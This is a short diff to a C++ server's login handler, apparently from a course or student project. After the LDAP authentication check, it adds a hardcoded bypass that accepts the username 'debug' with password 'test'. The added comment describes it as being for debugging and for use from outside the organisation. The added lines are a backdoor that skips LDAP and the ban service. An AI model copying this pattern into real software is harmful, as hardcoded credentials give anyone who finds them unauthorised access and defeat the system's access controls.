@@ -155,6 +155,13 @@ void *serverThread(int sock, std::string filepath, std::string clientIP, banned_
             bool valid = ldap.establish_ldap_auth(user, pass, clientIP, banservice);
 
             /**
+            * For Debugging, and using from outside FH
+            */
+            if (user == "debug" && pass == "test") {
+                valid = true;
+            }
+
+            /**
             * If invalid, tell the user and wait for new LOGIN request
             */
             if (valid) {
